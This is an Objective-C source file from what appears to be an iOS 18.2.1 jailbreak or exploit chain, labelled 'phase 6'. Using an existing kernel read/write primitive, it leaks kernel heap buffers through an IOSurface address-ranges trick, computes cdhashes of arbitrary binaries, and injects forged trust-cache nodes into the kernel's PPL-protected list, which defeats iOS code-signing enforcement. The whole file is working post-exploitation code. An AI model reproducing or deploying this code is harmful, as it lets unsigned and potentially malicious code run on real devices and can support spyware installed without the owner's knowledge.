#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <CommonCrypto/CommonDigest.h>
#include <uuid/uuid.h>
#include "phase6.h"
#include "offsets.h"

// ============================================================
//  Phase 6 — trust cache injection for iOS 18.2.1 (22C161, A14).
//
//  On A14 (PPL, no SPTM) the LOADED trust-cache runtime object is
//  heap-resident: the global `ppl_trust_cache_rt` slot just holds a
//  plain kalloc pointer, and the node objects + v1 file blobs of the
//  loaded list are plain kalloc memory too (Dopamine 3.x relies on
//  exactly this for its iOS 16+ PPL path). Splicing a new node into
//  the list therefore needs only the DarkSword kernel R/W — no PPL
//  bypass, no kcall.
//
//  The only missing ingredient is a kernel allocator, solved with the
//  IOSurface ranges trick (Dopamine primitives_IOSurface.m "16up"):
//  IOSurfaceCreate with IOSurfaceAddressRanges copies the user range
//  list into a kalloc'd array owned by the surface's IOMD; zeroing the
//  IOSurface's ranges/rangeCount fields leaks that array forever.
//
//  Struct offsets (22C161-verified):
//    IOSurface.memoryDescriptor  0x30   (Dopamine info.c iOS 17.4+)
//    IOSurface.ranges            0x360  (str x0,[x19,#0x360] in init)
//    IOSurface.rangeCount        0x3a4  (str w27,[x19,#0x3a4], len>>4)
//    IOMachPort.object           0x30   (iOS 17+)
//    IOSurfaceSendRight.surface  0x18
//    ipc_port.kobject            0x48   (iOS 17+)
//    trustcache node: next 0x0, prev 0x8, type 0x10, fileptr 0x18
//                     (size field dropped in iOS 18.1+, node 0x28)
//    head = **(rt slot + 0x0)  =>  (rt object + 0x20)
// ============================================================

extern void c_log(const char *fmt, ...);
#define printf(...) c_log(__VA_ARGS__)

extern uint64_t find_proc_by_pid(uint32_t pid);
extern uint64_t get_task_from_proc(uint64_t proc);

// SMR-decode (same rule as main.m's static smrdecode; t1sz fixed at 25)
static uint64_t ps6_smrdecode(uint64_t value, uint64_t base) {
    uint64_t bits = (base << (62 - 25));
    if ((value & bits) == 0) {
        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
    }
    return (value & 0xFFFFFFFFFFFFFFE0ULL);
}

// ============ port -> IOSurface kernel object ============

// mach_port -> kobject via our ipc space table (SMR-walked), then
// IOMachPort.object -> IOSurfaceSendRight -> .surface (+0x18).
static uint64_t ps6_port_to_surface(mach_port_t port) {
    uint64_t task = gOurTask;
    if (!task) task = get_task_from_proc(find_proc_by_pid((uint32_t)getpid()));
    if (!task) return 0;

    uint64_t space = kread_ptr(task + OFF_TASK_ITK_SPACE);
    if (!space) return 0;
    uint64_t table = kread_ptr(space + OFF_IPC_SPACE_TABLE);
    if (!table) return 0;
    // iOS 16.3+: table is an SMR pointer (smr base 2 on this build)
    if ((table >> 48) != 0xFFFF) table = ps6_smrdecode(table, SMR_BASE);
    uint64_t entry = table + (SIZEOF_IPC_ENTRY * ((uint64_t)(port >> 8)));
    uint64_t obj = kread_ptr(entry + OFF_IPC_ENTRY_IE_OBJECT);
    if (!obj) return 0;
    uint64_t kobj = kread_ptr(obj + OFF_IPC_PORT_KOBJECT);
    if (!kobj) return 0;

    uint64_t sendRight = kread_ptr(kobj + OFF_IOMACHPORT_OBJECT);
    if (!sendRight) return 0;
    return kread_ptr(sendRight + OFF_IOSURFACE_SENDRIGHT_SURFACE);
}

// Dopamine 3.x (trustcache.c) semantics on PPL iOS 16-18:
//   ppl_trust_cache_rt symbol      = kaddr of a global VAR (slot)
//   *(slot + 0x20)                 = ANCHOR: kaddr of the head-link field
//   *anchor                        = first loaded tc node (or 0)
// Insert: new->next = oldHead; oldHead->prev = new (prevptr!=0 on 18.1+?
// 18.4 drops prev again — trustcache.c guards with koffsetof != 0; we
// write prev unconditionally ONLY if oldHead != 0, matching their code).
static uint64_t g_tc_anchor = 0;

static uint64_t ps6_slot(void) {
    return gKernelBase + PPL_TRUST_CACHE_RT_OFF;
}

bool phase6_init(void) {
    if (gKernelBase == 0) { printf("[-] phase6: kernel base not set\n"); return false; }

    uint64_t slot = ps6_slot();
    uint64_t rt = kread64(slot);
    if (!rt || (rt >> 48) != 0xFFFF) {
        printf("[-] phase6: rt slot 0x%llx -> 0x%llx invalid\n", slot, rt);
        return false;
    }
    uint64_t anchor = kread64(slot + 0x20);
    if (!anchor || (anchor >> 48) != 0xFFFF) {
        printf("[-] phase6: anchor @slot+0x20 -> 0x%llx invalid\n", anchor);
        return false;
    }
    uint64_t head = kread64(anchor);
    g_tc_anchor = anchor;
    printf("[phase6] slot=0x%llx rt=0x%llx anchor=0x%llx head=0x%llx\n",
           slot, rt, anchor, head);
    phase6_dump_tc_head();

    // IOSurface offset probe: descriptor should exist for a plain surface.
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge NSString*)kIOSurfaceWidth : @16,
        (__bridge NSString*)kIOSurfaceHeight : @16,
        (__bridge NSString*)kIOSurfaceBytesPerElement : @4,
    });
    if (!surf) { printf("[-] phase6: IOSurfaceCreate probe failed (entitlement?)\n"); return false; }
    mach_port_t port = IOSurfaceCreateMachPort(surf);
    CFRelease(surf);
    uint64_t s = port == MACH_PORT_NULL ? 0 : ps6_port_to_surface(port);
    if (!s) { printf("[-] phase6: IOMachPort->surface chain failed\n"); return false; }
    uint64_t desc = kread_ptr(s + OFF_IOSURFACE_MEMORY_DESCRIPTOR);
    printf("[phase6] probe IOSurface=0x%llx desc=0x%llx\n", s, desc);
    return true;
}

// ============ kalloc via IOSurface ranges trick ============

static CFNumberRef ps6_cfnum64(uint64_t v) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
}

uint64_t ps6_kalloc(uint64_t size) {
    if (size == 0 || size > 0x10000) return 0;

    static vm_size_t dummyPageSize = 0x4000;
    static vm_address_t dummyPage = 0;
    if (dummyPage == 0) {
        if (vm_allocate(mach_task_self(), &dummyPage, dummyPageSize,
                        VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return 0;
        memset((void*)dummyPage, 0x42, dummyPageSize);
    }

    uint64_t rangesAlignedSize = (size + 0xf) & ~0xf;
    uint64_t *userspaceRanges = malloc(rangesAlignedSize);
    if (!userspaceRanges) return 0;
    for (uint64_t i = 0; i < rangesAlignedSize / sizeof(uint64_t); i += 2) {
        userspaceRanges[i]   = dummyPage;
        userspaceRanges[i+1] = dummyPageSize;
    }
    CFDataRef data = CFDataCreate(kCFAllocatorDefault,
                                  (const UInt8*)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);
    if (!data) return 0;

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFNumberRef sizeNum = ps6_cfnum64(dummyPageSize);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     sizeNum);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), data);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    CFRelease(data); CFRelease(sizeNum); CFRelease(dict);
    if (!surfaceRef) { printf("[-] phase6: IOSurfaceCreate(kalloc) failed\n"); return 0; }

    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    if (port == MACH_PORT_NULL) { CFRelease(surfaceRef); return 0; }
    IOSurfaceDecrementUseCount(surfaceRef);
    CFRelease(surfaceRef);

    uint64_t surface = ps6_port_to_surface(port);
    if (!surface) {
        mach_port_deallocate(mach_task_self(), port);
        printf("[-] phase6: port->surface failed\n");
        return 0;
    }

    uint32_t rc = kread32(surface + OFF_IOSURFACE_RANGE_COUNT);
    uint64_t va = kread_ptr(surface + OFF_IOSURFACE_RANGES);
    if ((uint64_t)rc * 0x10 < size || va == 0) {
        mach_port_deallocate(mach_task_self(), port);
        printf("[-] phase6: range count 0x%x too small for 0x%llx\n", rc, size);
        return 0;
    }

    // Leak: clear the surface's ranges bookkeeping so the kalloc buffer is
    // never kfree'd when the client/surface tears down. The Mach port stays
    // alive on purpose (holds the last ref).
    kwrite64(surface + OFF_IOSURFACE_RANGES, 0);
    kwrite32(surface + OFF_IOSURFACE_RANGE_COUNT, 0);
    return va;
}

static void ps6_kwritebuf(uint64_t where, const void *buf, size_t size) {
    // main.m kwrite_buf takes a non-const buf; cast is safe (read-only).
    extern void kwrite_buf(uint64_t addr, void *buf, size_t size);
    kwrite_buf(where, (void*)buf, size);
}

// ============ trust cache v1 construction + insert ============

#define PS6_TC_HDR_SIZE   0x18       // version(4) uuid(16) length(4)
#define PS6_TC_ENTRY_SIZE 22         // hash(20) hash_type(1) flags(1)

static int ps6_cmp_entries(const void *a, const void *b) {
    return memcmp(a, b, PS6_TC_ENTRY_SIZE);
}

static uint8_t *ps6_build_tc_file(const uint8_t *hashes /*20B each*/,
                                  uint32_t count, uint32_t *out_size) {
    uint32_t sz = PS6_TC_HDR_SIZE + count * PS6_TC_ENTRY_SIZE;
    uint8_t *buf = calloc(1, sz);
    if (!buf) return NULL;
    *(uint32_t*)(buf + 0x00) = 1;               // version
    uuid_t u; uuid_generate(u);
    memcpy(buf + 0x04, u, 16);                  // uuid
    *(uint32_t*)(buf + 0x14) = count;
    uint8_t *e = buf + PS6_TC_HDR_SIZE;
    for (uint32_t i = 0; i < count; i++) {
        memcpy(e + i * PS6_TC_ENTRY_SIZE, hashes + i * 20, 20);
        e[i * PS6_TC_ENTRY_SIZE + 20] = CS_HASH_TYPE_SHA1;
        e[i * PS6_TC_ENTRY_SIZE + 21] = 0;
    }
    qsort(e, count, PS6_TC_ENTRY_SIZE, ps6_cmp_entries);
    *out_size = sz;
    return buf;
}

bool phase6_inject_cdhashes(const uint8_t *hashes, uint32_t count) {
    if (!hashes || count == 0) return false;

    uint32_t fsize = 0;
    uint8_t *file = ps6_build_tc_file(hashes, count, &fsize);
    if (!file) return false;

    uint64_t nodeAlloc = ps6_kalloc(TC_NODE_SIZE);
    uint64_t fileAlloc = ps6_kalloc(fsize);
    if (!nodeAlloc || !fileAlloc) {
        printf("[-] phase6: kalloc TC failed (node=0x%llx file=0x%llx)\n",
               nodeAlloc, fileAlloc);
        free(file);
        return false;
    }

    ps6_kwritebuf(fileAlloc, file, fsize);
    free(file);

    if (g_tc_anchor == 0) { printf("[-] phase6: call phase6_init() first\n"); return false; }
    // iOS 18.1+ node: next/prev/type/fileptr; then flip the head link.
    uint64_t oldHead = kread64(g_tc_anchor);

    kwrite64(nodeAlloc + TC_NODE_NEXT, oldHead);
    kwrite64(nodeAlloc + TC_NODE_PREV, 0);
    kwrite64(nodeAlloc + TC_NODE_TYPE, TRUSTCACHE_TYPE_DYNAMIC);
    kwrite64(nodeAlloc + TC_NODE_FILE, fileAlloc);

    // 18.2.1 = darwin 24.2: prevptr still present (removed only in 18.4),
    // so patch oldHead->prev like Dopamine's guarded write.
    if (oldHead) kwrite64(oldHead + TC_NODE_PREV, nodeAlloc);
    kwrite64(g_tc_anchor, nodeAlloc);

    printf("[phase6] TC injected: node=0x%llx file=0x%llx entries=%u (prev head=0x%llx)\n",
           nodeAlloc, fileAlloc, count, oldHead);
    return true;
}

void phase6_dump_tc_head(void) {
    if (g_tc_anchor == 0) {
        uint64_t slot = gKernelBase ? gKernelBase + PPL_TRUST_CACHE_RT_OFF : 0;
        if (!slot) { printf("[-] phase6: dump: kernel base not set\n"); return; }
        g_tc_anchor = kread64(slot + 0x20);
        if (!g_tc_anchor) { printf("[-] phase6: dump: no anchor\n"); return; }
    }
    uint64_t node = kread64(g_tc_anchor);
    for (int i = 0; node && i < 8; i++) {
        uint64_t type = kread64(node + TC_NODE_TYPE) & 0xFF;
        uint64_t file = kread_ptr(node + TC_NODE_FILE);
        uint32_t len  = file ? kread32(file + 0x14) : 0;
        printf("  tc[%d] node=0x%llx type=%llu file=0x%llx len=%u next=0x%llx\n",
               i, node, (unsigned long long)type, file, len,
               kread_ptr(node + TC_NODE_NEXT));
        node = kread_ptr(node + TC_NODE_NEXT);
    }
}

// ============ cdhash extraction (userspace, over CS blob) ============
//
// AMFI/XNU trust cache stores the raw 20-byte "cdhash" = digest of the
// CodeDirectory blob truncated to 20 bytes, plus the hash_type byte that
// tells the verifier which digest produced it. So parse LC_CODE_SIGNATURE,
// find the best CodeDirectory, digest with its own algorithm, emit a
// 20-byte hash + hash_type (1=SHA-1, 2=SHA-256 truncated).

// ---- minimal CS blob structs (big-endian on disk, Apple cs_blobs.h) ----
typedef struct { uint32_t magic, length, count; } PS6_CS_SuperBlob;
typedef struct { uint32_t type, offset; } PS6_CS_BlobIndex;
typedef struct {
    uint32_t magic, length, version, flags;
    uint32_t hashOffset, identOffset, nSpecialSlots, nCodeSlots, codeLimit;
    uint8_t  hashSize, hashType, platform, pageSize;
    uint32_t spare2;
} PS6_CS_CodeDirectory;

#define PS6_CSMAGIC_EMBEDDED_SIGNATURE 0xfade0cc0u
#define PS6_CSMAGIC_CODEDIRECTORY      0xfade0c02u
#define PS6_CSSLOT_CODEDIRECTORY       0u

// be32toh is not available on iOS SDK headers; byteswap manually (arm64 is LE).
static inline uint32_t be32(uint32_t v) { return __builtin_bswap32(v); }

static bool ps6_cdhash_from_cd(const uint8_t *cs, uint32_t cs_size,
                               uint8_t out[20], uint8_t *out_type) {
    if (cs_size < 0x28) return false;
    uint32_t magic = be32(*(const uint32_t*)cs);

    const uint8_t *best = NULL; uint32_t bestLen = 0, bestVer = 0;

    if (magic == PS6_CSMAGIC_CODEDIRECTORY) {
        const PS6_CS_CodeDirectory *cd = (const PS6_CS_CodeDirectory*)cs;
        uint32_t len = be32(cd->length);
        if (len >= 0x28 && len <= cs_size) { best = cs; bestLen = len; }
    } else if (magic == PS6_CSMAGIC_EMBEDDED_SIGNATURE) {
        const PS6_CS_SuperBlob *sb = (const PS6_CS_SuperBlob*)cs;
        uint32_t n = be32(sb->count);
        if ((size_t)(0xC + n*8) > cs_size) return false;
        const PS6_CS_BlobIndex *idx = (const PS6_CS_BlobIndex*)(cs + 0xC);
        for (uint32_t i = 0; i < n; i++) {
            uint32_t off = be32(idx[i].offset);
            if (off > cs_size - 8) continue;
            if (be32(*(const uint32_t*)(cs + off)) != PS6_CSMAGIC_CODEDIRECTORY) continue;
            const PS6_CS_CodeDirectory *cd = (const PS6_CS_CodeDirectory*)(cs + off);
            uint32_t len = be32(cd->length);
            if (len < 0x28 || off + len > cs_size) continue;
            uint32_t ver = be32(cd->version);
            if (!best || ver > bestVer) { best = cs + off; bestLen = len; bestVer = ver; }
        }
    }
    if (!best) return false;

    uint8_t hashSize = best[0x24];
    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
    // cdhash = digest of the ENTIRE serialized CodeDirectory blob.
    if (hashSize == 20) {
        CC_SHA1(best, bestLen, digest);
        memcpy(out, digest, 20);
        if (out_type) *out_type = CS_HASH_TYPE_SHA1;
    } else {
        // SHA-256 CDs: cdhash = first 20 bytes of the full digest,
        // stored with hash_type 2 (matches Dopamine's file builder).
        CC_SHA256(best, bestLen, digest);
        memcpy(out, digest, 20);
        if (out_type) *out_type = 2;
    }
    return true;
}

// One-pass, type-aware extraction: first mappable slice's cdhash + hash type.
static bool ps6_extract_cdhash_typed(const char *path, uint8_t (*out)[20],
                                     uint8_t *out_type);

bool ps6_extract_cdhash(const char *path, uint8_t (*out)[20]) {
    uint8_t t;
    return ps6_extract_cdhash_typed(path, out, &t);
}

// One-pass, type-aware extraction: first mappable slice's cdhash + hash type.
static bool ps6_extract_cdhash_typed(const char *path, uint8_t (*out)[20], uint8_t *out_type) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return false;
    off_t sz = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);
    if (sz <= 0 || sz > 0x10000000) { close(fd); return false; }
    uint8_t *data = malloc((size_t)sz);
    if (!data) { close(fd); return false; }
    ssize_t got = read(fd, data, (size_t)sz);
    close(fd);
    if (got != sz) { free(data); return false; }

    uint32_t be0 = (sz >= 4) ? be32(*(const uint32_t*)data) : 0;
    bool ok = false;
    if (be0 == FAT_MAGIC || be0 == FAT_CIGAM) {
        const struct fat_header *fh = (const struct fat_header*)data;
        uint32_t nf = be32(fh->nfat_arch);
        const struct fat_arch *fa = (const struct fat_arch*)(data + sizeof(*fh));
        for (uint32_t i = 0; i < nf && i < 16; i++) {
            uint32_t off = be32(fa[i].offset);
            uint32_t fsz = be32(fa[i].size);
            if (off > (uint32_t)sz || off + fsz > (uint32_t)sz) continue;
            uint8_t h[20]; uint8_t t;
            // scan the slice mach-o for LC_CODE_SIGNATURE
            if (fsz >= sizeof(struct mach_header_64)) {
                const struct mach_header_64 *mh =
                    (const struct mach_header_64*)(data + off);
                if (mh->magic == MH_MAGIC_64) {
                    const uint8_t *lcp = data + off + sizeof(struct mach_header_64);
                    const uint8_t *end = data + off + fsz;
                    for (uint32_t c = 0; c < mh->ncmds; c++) {
                        if (lcp + sizeof(struct load_command) > end) break;
                        const struct load_command *lc = (const struct load_command*)lcp;
                        if (lc->cmdsize < sizeof(struct load_command) ||
                            lcp + lc->cmdsize > end) break;
                        if (lc->cmd == LC_CODE_SIGNATURE) {
                            const struct linkedit_data_command *sig =
                                (const struct linkedit_data_command*)lcp;
                            uint32_t so = sig->dataoff, sl = sig->datasize;
                            if (off + so + sl <= (uint32_t)sz &&
                                ps6_cdhash_from_cd(data + off + so, sl, h, &t)) {
                                memcpy(*out, h, 20);
                                if (out_type) *out_type = t;
                                ok = true;
                            }
                            break;
                        }
                        lcp += lc->cmdsize;
                    }
                }
            }
            if (ok) break;
        }
    } else {
        uint8_t h[20]; uint8_t t;
        if (sz >= (off_t)sizeof(struct mach_header_64)) {
            const struct mach_header_64 *mh = (const struct mach_header_64*)data;
            if (mh->magic == MH_MAGIC_64) {
                const uint8_t *lcp = data + sizeof(struct mach_header_64);
                const uint8_t *end = data + sz;
                for (uint32_t c = 0; c < mh->ncmds; c++) {
                    if (lcp + sizeof(struct load_command) > end) break;
                    const struct load_command *lc = (const struct load_command*)lcp;
                    if (lc->cmdsize < sizeof(struct load_command) ||
                        lcp + lc->cmdsize > end) break;
                    if (lc->cmd == LC_CODE_SIGNATURE) {
                        const struct linkedit_data_command *sig =
                            (const struct linkedit_data_command*)lcp;
                        uint32_t so = sig->dataoff, sl = sig->datasize;
                        if (so + sl <= (uint32_t)sz &&
                            ps6_cdhash_from_cd(data + so, sl, h, &t)) {
                            memcpy(*out, h, 20);
                            if (out_type) *out_type = t;
                            ok = true;
                        }
                        break;
                    }
                    lcp += lc->cmdsize;
                }
            }
        }
    }
    free(data);
    return ok;
}

// Inject an arbitrary pre-built v1 trust cache blob directly. This is the
// workhorse path used by load_trust_cache(): bootstrap tar already has a
// TrustCache file with the right hashes for the whole bootstrap.
bool phase6_inject_tc_blob(const uint8_t *blob, uint32_t blob_size) {
    if (!blob || blob_size < PS6_TC_HDR_SIZE) return false;
    uint32_t ver = *(const uint32_t*)blob;
    if (ver != 1) { printf("[-] phase6: tc blob version %u unsupported\n", ver); return false; }

    uint64_t nodeAlloc = ps6_kalloc(TC_NODE_SIZE);
    uint64_t fileAlloc = ps6_kalloc(blob_size);
    if (!nodeAlloc || !fileAlloc) {
        printf("[-] phase6: tc blob kalloc failed (node=0x%llx file=0x%llx)\n",
               nodeAlloc, fileAlloc);
        return false;
    }
    ps6_kwritebuf(fileAlloc, blob, blob_size);

    if (g_tc_anchor == 0) { printf("[-] phase6: call phase6_init() first\n"); return false; }
    uint64_t oldHead = kread64(g_tc_anchor);

    kwrite64(nodeAlloc + TC_NODE_NEXT, oldHead);
    kwrite64(nodeAlloc + TC_NODE_PREV, 0);
    kwrite64(nodeAlloc + TC_NODE_TYPE, TRUSTCACHE_TYPE_DYNAMIC);
    kwrite64(nodeAlloc + TC_NODE_FILE, fileAlloc);

    // 18.2.1 = darwin 24.2: prevptr still present (removed only in 18.4),
    // so patch oldHead->prev like Dopamine's guarded write.
    if (oldHead) kwrite64(oldHead + TC_NODE_PREV, nodeAlloc);
    kwrite64(g_tc_anchor, nodeAlloc);

    printf("[phase6] TC blob injected: node=0x%llx file=0x%llx size=0x%x (prev head=0x%llx)\n",
           nodeAlloc, fileAlloc, blob_size, oldHead);
    return true;
}

bool phase6_inject_cdhashes_from_files(const char **paths, uint32_t npaths) {
    // gather 22-byte entries (20B hash + hash_type + flags)
    uint8_t entries[64 * PS6_TC_ENTRY_SIZE];
    uint32_t n = 0;
    for (uint32_t i = 0; i < npaths && n < 64; i++) {
        uint8_t h[20]; uint8_t t;
        if (!ps6_extract_cdhash_typed(paths[i], &h, &t)) {
            printf("[-] phase6: cdhash extract failed: %s\n", paths[i]);
            continue;
        }
        memcpy(entries + n * PS6_TC_ENTRY_SIZE, h, 20);
        entries[n * PS6_TC_ENTRY_SIZE + 20] = t;
        entries[n * PS6_TC_ENTRY_SIZE + 21] = 0;
        n++;
    }
    if (!n) return false;

    // sort by hash
    qsort(entries, n, PS6_TC_ENTRY_SIZE, ps6_cmp_entries);

    uint32_t fsize = PS6_TC_HDR_SIZE + n * PS6_TC_ENTRY_SIZE;
    uint8_t *file = calloc(1, fsize);
    if (!file) return false;
    *(uint32_t*)file = 1;
    uuid_t u; uuid_generate(u);
    memcpy(file + 4, u, 16);
    *(uint32_t*)(file + 0x14) = n;
    memcpy(file + PS6_TC_HDR_SIZE, entries, n * PS6_TC_ENTRY_SIZE);
    bool ok = phase6_inject_tc_blob(file, fsize);
    free(file);
    return ok;
}
